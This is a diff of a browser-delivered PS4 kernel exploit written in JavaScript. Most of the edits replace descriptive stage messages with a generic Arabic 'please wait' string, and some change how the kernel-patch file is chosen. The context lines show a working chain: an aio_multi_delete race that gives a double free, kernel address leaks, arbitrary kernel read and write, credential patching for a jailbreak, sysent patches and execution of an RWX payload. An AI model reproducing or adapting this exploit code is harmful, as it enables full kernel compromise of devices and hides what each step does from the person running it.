@@ -10,7 +10,7 @@ const lines = [];
 function post(tag, detail) {
     try {
         const x = new XMLHttpRequest();
-        x.open("POST", "/t", true);
+        x.open("POST", "t", true);
         x.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
         x.send("PS4-S4Q&tag=" + encodeURIComponent(tag)
              + "&detail=" + encodeURIComponent(String(detail == null ? "" : detail)));
@@ -204,9 +204,13 @@ function makeRpc(worker) {
     try {
         const params = new URLSearchParams(location.search);
 
-        const fwKey = offsetsFor(navigator.userAgent).key;
-        const kpatchName = fwKey
-            ? "patches/" + fwKey.replace(".", "") + ".bin" : null;
+        const fwResolved = offsetsFor(navigator.userAgent);
+        const fwKey = fwResolved.key;
+        // off.kpatch wins when a firmware shares another's kernel and therefore
+        // its blob -- 12.02 uses 1200.bin. Otherwise derive it from the key.
+        const kpatchName = fwResolved.off && fwResolved.off.kpatch
+            ? "patches/" + fwResolved.off.kpatch
+            : fwKey ? "patches/" + fwKey.replace(".", "") + ".bin" : null;
         let kpatch = null;
         try {
             if (kpatchName) {
@@ -281,7 +285,7 @@ function makeRpc(worker) {
                   + "WITHHELD. Nothing is freed twice and no reboot is owed."
                 : "  -- ARMED: the worker issues a REAL aio_multi_delete"));
 
-        state("يتم الآن تهكير الPS4 أنتظر قليلاً", "warn");
+        state("🔄 أنتظر رجاءاً...", "warn");
 
         await new Promise(function (r) { setTimeout(r, 0); });
         const carrier = await establishPrimitive({
@@ -375,7 +379,7 @@ function makeRpc(worker) {
         const wanted = [];
         for (const k in SYS) wanted.push(SYS[k]);
         for (const k in SYS9) wanted.push(SYS9[k]);
-        state("scanning libkernel for syscall stubs...", "warn");
+        state("🔄 أنتظر رجاءاً...", "warn");
         const tScan = Date.now();
         const stubRva = new Map();
 
@@ -681,7 +685,7 @@ function makeRpc(worker) {
                 return c.join(",");
             })() + " are available to this process)");
 
-        state("wiring the worker...", "warn");
+        state("🔄 أنتظر رجاءاً...", "warn");
         worker = new Worker("rpc_worker.js");
         rpc = makeRpc(worker);
         await rpc("ping");
@@ -742,7 +746,7 @@ function makeRpc(worker) {
         check("worker-answers-before-arm",
             (await rpc("ping")) === "pong", "");
 
-        state("setting up the aio batches...", "warn");
+        state("🔄 أنتظر رجاءاً...", "warn");
         const pairBuf = alloc(8);
         if (sc(SYS.socketpair, 1, SOCK_STREAM, 0, pairBuf.addr).i32 === -1)
             throw new Error("socketpair failed");
@@ -780,7 +784,7 @@ function makeRpc(worker) {
         }
         mark("SPRAY-CANCELLED", "");
 
-        state("dry run: everything but the racing delete...", "warn");
+        state("🔄 أنتظر رجاءاً...", "warn");
         servAddr.dv.setUint8(0, 16);
         servAddr.dv.setUint8(1, AF_INET);
         servAddr.dv.setUint16(2, 0x8d13, true);
@@ -1028,7 +1032,7 @@ function makeRpc(worker) {
             return null;
         }
 
-        state("racing...", "warn");
+        state("🔄 أنتظر رجاءاً...", "warn");
         mark("ARMED", "one core " + ONE_CORE + ", suspend rendezvous, attempts=" + ATTEMPTS
             + "  -- the worker now issues a REAL aio_multi_delete");
 
@@ -1303,7 +1307,7 @@ function makeRpc(worker) {
             mark("DOUBLE-FREE-ACHIEVED", "fds " + twinSocks.join(" and ")
                 + " now alias one 0x80 allocation");
 
-            state("leaking kernel addresses...", "warn");
+            state("🔄 أنتظر رجاءاً...", "warn");
             const leakOk = (function () {
                 function getRthdr(sock, size) {
                     leakLen.dv.setInt32(0, size, true);
@@ -1534,7 +1538,7 @@ function makeRpc(worker) {
                     + " dirty_fd=" + dirty);
                 mark("STAGE-2-DONE", "reqs1/reqs2/aio_info/target_id in hand");
 
-                state("stage 3: crafting the aio queue entry...", "warn");
+                state("🔄 أنتظر رجاءاً...", "warn");
 
                 sc(SYS.evf_delete, evf);
                 mark("EVF-DELETED", hx(evf));
@@ -1724,7 +1728,7 @@ function makeRpc(worker) {
                     + " alias one 0x100 allocation. make_karw is step 4i, and "
                     + "it is the first point where any of this can be repaired.");
 
-                state("stage 4: kernel read...", "warn");
+                state("🔄 أنتظر رجاءاً...", "warn");
 
                 sprayRthdr.u8.fill(0);
                 const karwLen = buildRthdr(sprayRthdr, 0x100);
@@ -2004,7 +2008,7 @@ function makeRpc(worker) {
                 mark("KREAD-STATS", kreadCalls + " kread8 calls, "
                     + kreadFail + " failed");
 
-                state("stage 5: kernel write...", "warn");
+                state("🔄 أنتظر رجاءاً...", "warn");
 
                 const kwTarget = pktinfoSelf.sub32(8);
                 const KW_A = 0x4b571337, KW_B = 0xfeedc0de;
@@ -2075,7 +2079,7 @@ function makeRpc(worker) {
                             + "aim=verified selfref=restored");
                 }
 
-                state("stage 6: locating the kernel base...", "warn");
+                state("🔄 أنتظر رجاءاً...", "warn");
                 const KSTR_RESIDUE = evfCv.low & 0x3fff;
                 const KSTR_LO = params.has("kstrlo")
                     ? parseInt(params.get("kstrlo"), 16) : 0x780000;
@@ -2250,7 +2254,7 @@ function makeRpc(worker) {
                                     + "the cleanup list -- closing master would "
                                     + "kmem_free slave's struct pipe");
 
-                                state("building KernelView...", "warn");
+                                state("🔄 أنتظر رجاءاً...", "warn");
 
                                 function toI64(v) {
                                     return (typeof v === "number")
@@ -2684,7 +2688,7 @@ function makeRpc(worker) {
                                         + "nothing is closed.");
                                 } else {
 
-                                state("stage 7: repairing the aliases...", "warn");
+                                state("🔄 أنتظر رجاءاً...", "warn");
 
                                 const PKTOPTS_M = 0x00;
                                 const PKTOPTS_RTHDR = 0x68;
@@ -2914,7 +2918,7 @@ function makeRpc(worker) {
                                         + "writes on top of that is how a clean "
                                         + "failure becomes a panic.");
                                 } else try {
-                                    state("stage 8: jailbreak...", "warn");
+                                    state("🔄 أنتظر رجاءاً...", "warn");
 
                                     const P_LIST_NEXT = 0x00, P_LIST_PREV = 0x08;
                                     const P_UCRED = 0x40, P_FD = 0x48, P_PID = 0xb0;
@@ -3119,7 +3123,7 @@ function makeRpc(worker) {
                                         + " kbase=" + (kbase || "null")
                                         + " blob=" + (kpatch ? kpatch.length : 0));
                                 } else try {
-                                    state("stage 9: kernel patches...", "warn");
+                                    state("🔄 أنتظر رجاءاً...", "warn");
                                     const sysent = kbase.add32(SYSENT_661);
                                     const gadget = kbase.add32(JMP_RSI_GADGET);
 
@@ -3333,7 +3337,7 @@ function makeRpc(worker) {
                                     mark("PAYLOAD-SKIPPED", "reason=payload=0");
                                 else if (payload && (kpatched || params.get("payload") === "1"))
                                     try {
-                                    state("stage 10: loading the payload...", "warn");
+                                    state("🔄 أنتظر رجاءاً...", "warn");
 
                                     const psize = (payload.length + 0x3fff) & ~0x3fff;
                                     const pr = PROT_READ | PROT_WRITE | PROT_EXEC;
@@ -3802,7 +3806,7 @@ function makeRpc(worker) {
                     : "") + ". See the stage 8/9/10 marks for what is left.");
             try {
                 stateEl.textContent = payloadRunning
-                    ? " PS4 JAILBREAK COMPLETE تم تهكير الجهاز بنجاح "
+                    ? "ALL DONE"
                     : kpatched ? "ROOT + KERNEL PATCHED -- NO REBOOT"
                     : jailbroken ? "ROOT -- NO REBOOT NEEDED"
                     : "REPAIRED -- NO REBOOT NEEDED";
